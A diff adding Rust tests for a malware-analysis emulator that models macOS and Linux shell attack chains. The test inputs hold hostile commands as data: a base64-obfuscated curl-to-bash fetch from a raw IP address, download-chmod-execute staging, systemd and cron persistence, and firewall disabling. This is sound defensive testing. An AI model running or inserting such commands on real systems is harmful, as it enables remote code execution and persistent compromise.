@@ -1,7 +1,7 @@
 use std::collections::BTreeMap;
 
 use base64::Engine as _;
-use emulator_core::{Engine, EventKind, Host, NetworkResponse};
+use emulator_core::{AnalysisLimits, Engine, EventKind, Host, NetworkResponse};
 
 use crate::{Runbox, RunboxInput};
 
@@ -847,4 +847,280 @@ fn headless_conhost_dispatches_the_nested_clickfix_chain() {
         .trace
         .iter()
         .any(|event| event.message == "unsupported executable: conhost.exe"));
+}
+
+#[test]
+fn bash_script_uses_macos_virtual_files_and_process_dispatch() {
+    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::BashScript(
+            "printf 'echo staged\\n' > /tmp/stage.sh; chmod +x /tmp/stage.sh; /tmp/stage.sh".into(),
+        ))
+        .unwrap();
+
+    assert_eq!(
+        result
+            .snapshot
+            .virtual_files
+            .iter()
+            .find(|file| file.path == "/tmp/stage.sh")
+            .and_then(|file| file.text.as_deref()),
+        Some("echo staged\n")
+    );
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event.kind == EventKind::ProcessIntent
+            && event
+                .data
+                .get("program")
+                .is_some_and(|program| program == "/tmp/stage.sh")
+    }));
+}
+
+#[test]
+fn osascript_dispatches_nested_shell_commands() {
+    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::BashScript(
+            r#"osascript -e 'do shell script "echo nested > /tmp/apple.txt"'"#.into(),
+        ))
+        .unwrap();
+
+    assert_eq!(
+        result
+            .snapshot
+            .virtual_files
+            .iter()
+            .find(|file| file.path == "/tmp/apple.txt")
+            .and_then(|file| file.text.as_deref()),
+        Some("nested\n")
+    );
+    assert!(result
+        .snapshot
+        .artifacts
+        .iter()
+        .any(|artifact| artifact.name == "osascript.applescript"));
+}
+
+#[test]
+fn bash_download_write_chmod_execute_chain_is_modeled_end_to_end() {
+    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
+    runbox.host_mut().register_network_response(
+        "GET",
+        "https://example.invalid/stage.sh",
+        NetworkResponse::text("echo staged\n"),
+    );
+    let result = runbox
+        .emulate(RunboxInput::BashScript(
+            "curl -o /tmp/stage.sh https://example.invalid/stage.sh; chmod +x /tmp/stage.sh; /tmp/stage.sh"
+                .into(),
+        ))
+        .unwrap();
+
+    assert!(result
+        .snapshot
+        .network_activity
+        .iter()
+        .any(|activity| { activity.url == "https://example.invalid/stage.sh" }));
+    assert_eq!(
+        result
+            .snapshot
+            .virtual_files
+            .iter()
+            .find(|file| file.path == "/tmp/stage.sh")
+            .and_then(|file| file.text.as_deref()),
+        Some("echo staged\n")
+    );
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event.kind == EventKind::ProcessIntent
+            && event
+                .data
+                .get("program")
+                .is_some_and(|program| program == "/tmp/stage.sh")
+    }));
+}
+
+#[test]
+fn macos_base64_pipeline_and_nohup_execute_shell_stdin() {
+    let mut runbox = Runbox::new_macos(AnalysisLimits::default());
+    runbox.host_mut().register_network_response(
+        "GET",
+        "http://45.135.232.33/d/roberto99223",
+        NetworkResponse::text("echo decoded > /tmp/odyssey.txt"),
+    );
+    let result = runbox
+        .emulate(RunboxInput::BashScript(
+            r#"echo "Y3VybCAtcyBodHRwOi8vNDUuMTM1LjIzMi4zMy9kL3JvYmVydG85OTIyMyB8IG5vaHVwIGJhc2ggJg==" | base64 -d | bash"#
+                .into(),
+        ))
+        .unwrap();
+
+    let decoded = result
+        .snapshot
+        .virtual_files
+        .iter()
+        .find(|file| file.path == "/tmp/odyssey.txt")
+        .and_then(|file| file.text.as_deref());
+    assert_eq!(
+        decoded,
+        Some("decoded\n"),
+        "trace: {:#?}",
+        result.snapshot.trace
+    );
+}
+
+#[test]
+fn linux_systemd_unit_and_enable_are_modeled_as_persistence() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            r"
+printf '[Service]\nExecStart=/tmp/agent\n' > /etc/systemd/system/example.service
+systemctl enable --now /etc/systemd/system/example.service
+"
+            .into(),
+        ))
+        .unwrap();
+
+    assert_eq!(
+        result
+            .snapshot
+            .virtual_files
+            .iter()
+            .find(|file| file.path == "/etc/systemd/system/example.service")
+            .and_then(|file| file.text.as_deref()),
+        Some("[Service]\nExecStart=/tmp/agent\n")
+    );
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event.kind == EventKind::Persistence
+            && event
+                .data
+                .get("persistence_kind")
+                .is_some_and(|kind| kind == "linux_systemd")
+    }));
+    assert!(result
+        .snapshot
+        .artifacts
+        .iter()
+        .any(|artifact| artifact.name == "systemd-unit"));
+}
+
+#[test]
+fn linux_crontab_and_privilege_wrappers_dispatch_end_to_end() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            r"
+printf '* * * * * /tmp/agent\n' > /tmp/jobs
+sudo crontab /tmp/jobs
+"
+            .into(),
+        ))
+        .unwrap();
+
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event.kind == EventKind::Persistence
+            && event
+                .data
+                .get("persistence_kind")
+                .is_some_and(|kind| kind == "linux_cron")
+    }));
+    assert!(result
+        .snapshot
+        .artifacts
+        .iter()
+        .any(|artifact| artifact.name == "crontab"));
+}
+
+#[test]
+fn linux_base64_and_identity_utilities_return_synchronous_output() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            "printf 'c2FmZQ==' | base64 -d; whoami; uname -a".into(),
+        ))
+        .unwrap();
+
+    assert!(result
+        .snapshot
+        .trace
+        .iter()
+        .any(|event| { event.kind == EventKind::Output && event.message == "safe" }));
+    assert!(result
+        .snapshot
+        .trace
+        .iter()
+        .any(|event| { event.kind == EventKind::Output && event.message == "analysis" }));
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event.kind == EventKind::Output && event.message.contains("analysis-linux")
+    }));
+}
+
+#[test]
+fn linux_inline_interpreter_can_dispatch_nested_shell_behavior() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            r#"python3 -c 'import os; os.system("echo nested > /tmp/python.txt")'"#.into(),
+        ))
+        .unwrap();
+
+    assert_eq!(
+        result
+            .snapshot
+            .virtual_files
+            .iter()
+            .find(|file| file.path == "/tmp/python.txt")
+            .and_then(|file| file.text.as_deref()),
+        Some("nested\n")
+    );
+    assert!(result
+        .snapshot
+        .artifacts
+        .iter()
+        .any(|artifact| artifact.name == "python3-inline-script"));
+}
+
+#[test]
+fn linux_package_security_and_remote_access_utilities_are_typed() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            "apt-get install example; ufw disable; ssh analysis@example.invalid".into(),
+        ))
+        .unwrap();
+
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event
+            .data
+            .get("package_operation")
+            .is_some_and(|value| value == "true")
+    }));
+    assert!(result.snapshot.trace.iter().any(|event| {
+        event
+            .data
+            .get("security_control")
+            .is_some_and(|value| value == "true")
+    }));
+    assert!(result
+        .snapshot
+        .network_activity
+        .iter()
+        .any(|activity| activity.url == "tcp://example.invalid"));
+}
+
+#[test]
+fn linux_systemd_reload_is_not_persistence_by_itself() {
+    let mut runbox = Runbox::new_linux(AnalysisLimits::default());
+    let result = runbox
+        .emulate(RunboxInput::LinuxShellScript(
+            "systemctl daemon-reload".into(),
+        ))
+        .unwrap();
+
+    assert!(!result.snapshot.trace.iter().any(|event| {
+        event
+            .data
+            .get("persistence_kind")
+            .is_some_and(|kind| kind == "linux_systemd")
+    }));
 }
